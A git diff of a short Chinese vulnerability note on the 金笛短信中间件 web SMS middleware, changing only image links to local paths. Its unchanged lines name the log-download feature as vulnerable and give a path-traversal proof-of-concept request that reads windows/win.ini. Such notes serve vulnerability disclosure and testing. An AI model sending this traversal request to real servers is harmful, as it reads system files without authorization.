@@ -20,11 +20,11 @@ app="金笛短信中间件(WEB版)"
 
 登录页面
 
-![image-20220525150803211](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251508287.png)
+![image-20220525150803211](./images/202205251508287.png)
 
 存在漏洞的位置为 日志下载
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251508351.png)
+![](./images/202205251508351.png)
 
 验证POC
 
@@ -32,4 +32,4 @@ app="金笛短信中间件(WEB版)"
 /log?action=view&pageIndex=1&name=../../../windows/win.ini
 ```
 
-![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251508651.png)
+![](./images/202205251508651.png)
